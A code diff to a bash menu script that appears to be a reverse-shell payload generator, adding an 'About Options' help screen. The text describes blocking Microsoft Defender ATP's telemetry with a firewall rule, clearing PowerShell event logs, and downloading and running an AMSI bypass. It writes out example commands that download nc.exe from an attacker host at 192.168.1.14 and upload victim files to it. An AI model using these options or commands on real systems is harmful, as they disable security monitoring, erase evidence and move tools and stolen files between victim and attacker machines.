@@ -1907,9 +1907,9 @@ $(greenprint '20)') Powershell UDP - Windows - VBA Macro \n\n"
 echo -n $(cyanprint "OPTIONS")
 if [ "$blockmssense" == 1 ]
 then 
-    echo -ne "\n$(greenprint 'b)') Block Defender ATP - $(redprint 'On')"
+    echo -ne "\n$(greenprint 'b)') Block Microsoft Defender 365 (ATP) - $(redprint 'On')"
 else 
-    echo -ne "\n$(greenprint 'b)') Block Defender ATP - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'b)') Block Microsoft Defender 365 (ATP) - $(blueprint 'Off')"
     blockmssense=0
     
 fi
@@ -1926,23 +1926,24 @@ fi
 
 if [ "$enablefunc" == 1 ]
 then 
-    echo -ne "\n$(greenprint 'e)') Include upload/download function - $(redprint 'On')"
+    echo -ne "\n$(greenprint 'i)') Include upload/download function - $(redprint 'On')"
     
 else 
-    echo -ne "\n$(greenprint 'e)') Include upload/download function - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'i)') Include upload/download function - $(blueprint 'Off')"
     enablefunc=0
     
 fi
 
 if [ "$fullamsi" == 1 ]
 then 
-    echo -ne "\n$(greenprint 'f)') Download full AMSI bypass - $(redprint "On") $aurl"
+    echo -ne "\n$(greenprint 'f)') Download/run full AMSI bypass - $(redprint "On") $aurl"
     
 else 
-    echo -ne "\n$(greenprint 'f)') Download full AMSI bypass - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'f)') Download/run full AMSI bypass - $(blueprint 'Off')"
     fullamsi=0
     
 fi
+echo -ne "\n$(greenprint 'a)') About Options"
 echo 
 echo -ne "
 $(magentaprint 'm)')  Go Back to Main Menu
@@ -2032,7 +2033,7 @@ Choose an option:  "
         fi 
         submenu_powershell
         ;;
-    e)
+    i)
         if [ $enablefunc == 0 ]
         then 
             enablefunc=1
@@ -2054,7 +2055,38 @@ Choose an option:  "
         fi
         submenu_powershell
         ;;
+    a)
+        header
+        printf "
+        $(blueprint "About Options")
 
+        b) - Block Microsoft Defender 365 (ATP)
+        Add a block outgoing rule in windows firewall named nonsense, that blocks MSSense.exe. 
+        Requires administrator rights (Remember to cleanup)
+
+        c) Clear Powershell Eventlogs
+        Clears the logs:
+        - Microsoft-Windows-PowerShell/Operational
+        - Windows Powershell
+        Requires administrator rights
+
+        i) Include upload/download function
+        You can download files by entering:
+        $(yellowprint "download http://192.168.1.14/nc.exe /windows/temp/nc.exe") 
+        You can upload files to Updog by entering:
+        $(yellowprint "upload /windows/system32/calc.exe http://192.168.1.14/upload")
+        The upload requires Updog. You need to add /upload to your target-URL. 
+        Also, be aware of: Your updog-folder path $updog_dir will be sent in the requests.
+
+        f) Download/run full AMSI bypass
+        Downloads an runs Rastamouse AMSI Bypass. 
+        If you enable updog, you can have this file generated and served automatically. 
+        You can of course choose to enter a url to any other script you would have run upon connection
+
+        "
+        read -p "Press enter to return to menu"
+       submenu_powershell
+        ;;
         
 
 
